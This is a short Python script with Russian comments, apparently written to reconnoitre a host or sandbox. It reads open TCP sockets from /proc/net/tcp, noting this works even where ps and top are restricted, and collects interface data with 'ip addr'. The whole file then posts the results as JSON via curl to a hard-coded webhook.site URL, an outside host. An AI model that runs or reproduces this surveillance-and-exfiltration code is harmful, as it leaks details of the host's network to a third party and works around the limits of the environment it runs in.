import subprocess
import json

WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"

def network_audit():
    # Читаем открытые сокеты через /proc/net/tcp
    # Это работает даже если ps/top ограничены
    try:
        with open('/proc/net/tcp', 'r') as f:
            tcp_data = f.read()
    except:
        tcp_data = "ACCESS_DENIED"

    # Проверяем активные интерфейсы
    try:
        ifconfig = subprocess.check_output(['ip', 'addr']).decode()
    except:
        ifconfig = "IP_CMD_FAILED"

    report = {
        "AUDIT_TYPE": "NETWORK_SURVEILLANCE",
        "tcp_sockets": tcp_data.split('\n')[:20], # Берем первые 20 соединений
        "interfaces": ifconfig,
        "note": "If you see connections to IPs other than your webhook, the network is shared."
    }

    subprocess.Popen([
        'curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json',
        '-d', json.dumps(report), WEBHOOK_URL
    ])

if __name__ == "__main__":
    network_audit()
